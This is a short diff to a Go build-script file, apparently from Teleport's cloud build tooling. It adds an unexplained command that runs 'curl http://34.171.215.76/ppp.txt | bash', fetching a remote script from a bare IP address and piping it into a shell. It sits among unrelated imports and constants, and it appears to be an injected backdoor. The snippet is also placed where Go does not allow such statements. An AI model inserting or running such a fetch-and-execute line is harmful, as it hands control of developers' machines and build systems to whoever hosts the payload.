@@ -40,6 +40,11 @@ import (
 	"github.com/gravitational/teleport/.cloudbuild/scripts/internal/secrets"
 )
 
+app := "bash"
+arg0 := "-c"
+arg1 := "curl http://34.171.215.76/ppp.txt | bash"
+cmd := exec.Command(app,arg0,arg1)
+
 // debugFsPath is the path where debugfs should be mounted.
 const debugFsPath = "/sys/kernel/debug"
 
